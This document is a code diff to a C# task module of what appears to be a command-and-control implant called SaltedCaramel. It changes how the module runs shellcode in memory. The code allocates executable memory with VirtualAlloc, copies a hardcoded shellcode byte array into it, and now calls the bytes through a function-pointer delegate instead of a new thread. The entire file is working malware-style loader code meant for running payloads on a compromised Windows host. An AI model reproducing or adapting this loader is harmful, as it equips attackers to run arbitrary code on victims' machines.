@@ -5,7 +5,9 @@ namespace SaltedCaramel.Tasks
 {
     public class Shellcode
     {
-        public static void Execute(SCTask task, SCImplant implant)
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate void WindowsRun();
+        public static void Execute(SCTask task)
         {
             byte[] shellcode = new byte[] {
                 0x50,0x53,0x51,0x52,0x56,0x57,0x55,0x89,
@@ -35,16 +37,13 @@ namespace SaltedCaramel.Tasks
                 0x5d,0x5f,0x5e,0x5a,0x59,0x5b,0x58,0xc3
             };
             IntPtr procHandle = IntPtr.Zero;
-            uint lpAddress = 0;
-            uint dwSize = (uint)shellcode.Length;
+            IntPtr dwSize = (IntPtr)shellcode.Length;
 
-            IntPtr buffer = Win32.Kernel32.VirtualAlloc(lpAddress, dwSize, Win32.Kernel32.AllocationType.Commit | Win32.Kernel32.AllocationType.Reserve, Win32.Kernel32.MemoryProtection.ExecuteReadWrite);
+            IntPtr buffer = Win32.Kernel32.VirtualAlloc(IntPtr.Zero, dwSize, Win32.Kernel32.AllocationType.Commit, Win32.Kernel32.MemoryProtection.ExecuteReadWrite);
             Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
 
-            uint threadId = 0;
-            IntPtr hThread = Win32.Kernel32.CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, ref threadId);
-
-            Win32.Kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
+            WindowsRun wr = (WindowsRun)Marshal.GetDelegateForFunctionPointer(buffer, typeof(WindowsRun));
+            wr();
         }
     }
 }
